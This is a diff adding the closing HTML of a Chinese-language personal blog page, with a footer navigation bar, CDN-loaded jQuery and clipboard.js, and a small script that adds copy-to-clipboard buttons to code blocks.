+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2021
+    Polo
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
